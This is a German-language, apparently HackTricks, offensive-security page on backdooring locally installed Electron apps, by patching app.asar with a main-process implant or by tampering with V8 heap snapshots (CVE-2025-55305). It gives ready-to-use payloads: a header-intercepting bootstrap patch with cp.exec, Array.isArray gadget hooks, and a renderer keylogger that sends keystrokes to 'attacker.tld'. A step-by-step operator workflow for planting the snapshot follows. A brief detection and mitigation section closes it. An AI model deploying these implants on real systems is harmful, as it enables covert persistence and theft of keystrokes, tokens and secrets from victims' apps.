# Lokale Code-Injection und Snapshot-Manipulation in Electron

{{#include ../../banners/hacktricks-training.md}}

## Lokale Code-Injection in Electron

Wenn du eine lokal installierte Electron-Anwendung ändern oder instrumentieren kannst, kannst du sie möglicherweise dazu bringen, beliebiges JavaScript auszuführen. Siehe:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Eine lokale Node-Inspector- oder Chromium-DevTools-Debugging-Schnittstelle findest du unter [Missbrauch von Node-Inspector/CEF-Debugging](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-Exploitation: ASAR-/Main-Process-Implants

Wenn du **Schreibzugriff** auf das Ressourcenverzeichnis einer Electron-App erhältst, ist das **Patchen von `app.asar`** (oder des geladenen JS-Einstiegspunkts) eine sehr praktische Post-Exploitation-Methode. Warte anschließend, bis der Benutzer die App erneut startet. Anders als bei einem reinen Renderer-XSS wird Code, der aus dem **Main Process** geladen wird, in der **Node.js-Laufzeitumgebung** der App ausgeführt. Daher kann er üblicherweise auf das **Dateisystem** zugreifen, Befehle starten, Electron-APIs abfangen und den authentifizierten Anwendungsstatus untersuchen.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Typischer Ablauf:

1. `app.asar` entpacken und die eigentliche Bootstrap-Datei anhand von `package.json` (`main`) oder der vorhandenen Startlogik ermitteln.
2. Einen kleinen Loader im **Main Process** (oder einen Preload-/Main-Process-Hook) hinzufügen und das Archiv neu packen.
3. Warten, bis die Anwendung erneut gestartet wird, und das Implantat zum Erfassen von Laufzeitdaten verwenden, nachdem der Benutzer die Desktop-App entsperrt oder sich darin authentifiziert hat.

Beispiel für einen minimalen Bootstrap-Patch:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Praktische Auswirkungen:

- **Datendiebstahl bei vertrauenswürdigen Clients**: Sobald die Desktop-App Daten für den Benutzer entschlüsselt oder lädt, kann das Implantat sie zur Laufzeit auslesen. Deshalb sind **E2EE-Messaging-Clients** (Signal/Slack/Mattermost) und **Vault-/Secret-Manager** weiterhin interessante Ziele auf der Endpoint-Ebene.
- **Missbrauch von Sitzungen/Tokens**: Electron-Implantate können App-Cookies, Bearer-Tokens, Request-Header, Workspace-Dateien oder Repository-Zugangsdaten stehlen, auf die der laufende Client zugreifen kann (z. B. über authentifizierte VS-Code-Erweiterungen oder Git-Integrationen).
- **Pivoting im Kontext des Opfers**: Eine gepatchte App kann Requests über den Arbeitsplatzrechner des Opfers weiterleiten und dabei die IP-Adresse, den TLS-Fingerprint und die Anwendungssitzung des Opfers wiederverwenden, statt nur rohe Tokens zu exfiltrieren.

> [!NOTE]
> Wenn das Ziel **ASAR integrity** / **OnlyLoadAppFromAsar** oder gehärtete Electron-**fuses** aktiviert hat, benötigen Sie möglicherweise eine andere lokale Primitive zum Laden von Code (z. B. fuse abuse oder snapshot tampering). Weitere lokale Implantat-Optionen und Details zu fuses finden Sie auf der Injection-Seite für macOS.

## Lokales Backdooring durch Manipulation von V8-Heap-Snapshots (Electron/Chromium) – CVE-2025-55305

Electron- und Chromium-basierte Apps deserialisieren beim Start einen vorbereiteten V8-Heap-Snapshot (v8_context_snapshot.bin und optional browser_v8_context_snapshot.bin), um jeden V8-Isolate (main, preload, renderer) zu initialisieren. Historisch behandelten die Integritäts-Fuses von Electron diese Snapshots nicht als ausführbaren Inhalt, sodass sie sowohl der Fuse-basierten Integritätsprüfung als auch den Code-Signaturprüfungen des Betriebssystems entgingen. Daher ermöglichte das Ersetzen des Snapshots in einer benutzerschreibbaren Installation eine unauffällige, persistente Codeausführung innerhalb der App, ohne die signierten Binärdateien oder ASAR zu verändern.<sup>[[2]](#references)</sup>

Wichtige Punkte
- Integritätslücke: EnableEmbeddedAsarIntegrityValidation und OnlyLoadAppFromAsar überprüfen JavaScript der App innerhalb des ASAR, deckten V8-Heap-Snapshots jedoch nicht ab (CVE-2025-55305). Chromium überprüft Snapshots ebenfalls nicht auf Integrität.<sup>[[3]](#references)[[4]](#references)</sup>
- Angriffsvoraussetzungen: Lokaler Schreibzugriff auf das Installationsverzeichnis der App. Das ist bei Systemen üblich, auf denen Electron-Apps oder Chromium-Browser in benutzerschreibbaren Pfaden installiert sind (z. B. %AppData%\Local unter Windows; /Applications unter macOS, mit Einschränkungen).
- Auswirkung: Zuverlässige Ausführung von JavaScript des Angreifers in jedem Isolate durch Überschreiben eines häufig verwendeten Built-ins (eines „Gadgets“), wodurch Persistenz und das Umgehen der Code-Signaturprüfung ermöglicht werden.
- Betroffene Angriffsfläche: Electron-Apps (auch mit aktivierten Fuses) und Chromium-basierte Browser, die Snapshots aus benutzerschreibbaren Pfaden laden.

Erstellen eines schädlichen Snapshots ohne Chromium zu bauen
- Verwenden Sie das vorgefertigte electron/mksnapshot, um ein Payload-JS zu einem Snapshot zu kompilieren und die v8_context_snapshot.bin der Anwendung zu überschreiben.<sup>[[5]](#references)[[6]](#references)</sup>

Beispiel für ein minimales Payload (Ausführung durch Erzwingen eines Absturzes nachweisen)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-bewusstes Payload-Routing (unterschiedlichen Code in main vs. renderer ausführen)
- Erkennung des Main-Prozesses: Node-only-Globals wie process.pid, process.binding() oder process.dlopen sind im Isolate des Main-Prozesses vorhanden.
- Erkennung des Browsers/Renderers: Browser-only-Globals wie alert sind verfügbar, wenn der Code in einem Dokumentkontext ausgeführt wird.

Beispiel für ein Gadget, das die Node-Funktionen des Main-Prozesses einmalig prüft
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC für Datendiebstahl im Renderer-/Browser-Kontext (z. B. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator-Workflow
1) Schreibe payload.js, das ein häufig verwendetes Built-in überschreibt (z. B. Array.isArray) und optional je nach Isolate verzweigt.
2) Erstelle den Snapshot ohne Chromium-Quellcode:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Überschreibe die Snapshot-Datei(en) der Zielanwendung:
   - v8_context_snapshot.bin (wird immer verwendet)
   - browser_v8_context_snapshot.bin (wenn der LoadBrowserProcessSpecificV8Snapshot-Fuse verwendet wird)
4) Starte die Anwendung; das Gadget wird ausgeführt, sobald das ausgewählte Built-in verwendet wird.

Hinweise und Überlegungen
- Integritäts-/Signaturumgehung: Snapshot-Dateien werden bei Code-Signing-Prüfungen nicht als native ausführbare Dateien behandelt und waren (historisch) weder durch Electron-Fuses noch durch Chromium-Integritätskontrollen abgedeckt.
- Persistenz: Das Ersetzen des Snapshots in einer benutzerbeschreibbaren Installation übersteht in der Regel App-Neustarts und lässt die App signiert und legitim erscheinen.
- Chromium-Browser: Dasselbe Manipulationskonzept gilt für Chrome und Derivate, die an benutzerbeschreibbaren Speicherorten installiert sind. Chrome verfügt über weitere Integritätsmaßnahmen, schließt physisch lokalen Zugriff jedoch ausdrücklich aus seinem Bedrohungsmodell aus.<sup>[[9]](#references)[[10]](#references)</sup>

Erkennung und Gegenmaßnahmen
- Snapshots als ausführbaren Inhalt behandeln und in die Integritätsdurchsetzung einbeziehen (CVE-2025-55305-Fix).
- Installationsorte bevorzugen, auf die nur Admins Schreibzugriff haben; Hashes für v8_context_snapshot.bin und browser_v8_context_snapshot.bin als Baseline erfassen und überwachen.
- Frühes Überschreiben von Built-ins zur Laufzeit und unerwartete Snapshot-Änderungen erkennen; alarmieren, wenn deserialisierte Snapshots nicht den erwarteten Werten entsprechen.

## References

- [1] [JS-Tap v3: Endpoint-Post-Exploitation mit JavaScript-Implants](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Umgehung von Code-Integritätsprüfungen, um Signal, 1Password, Slack und mehr lokal zu backdooren](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron-Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron-ASAR-Integrität](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Benutzerdefinierte V8-Startup-Snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Laden unsignierten Codes deaktivieren (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome-Sicherheits-FAQ: Physisch lokale Angriffe liegen außerhalb des Geltungsbereichs](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
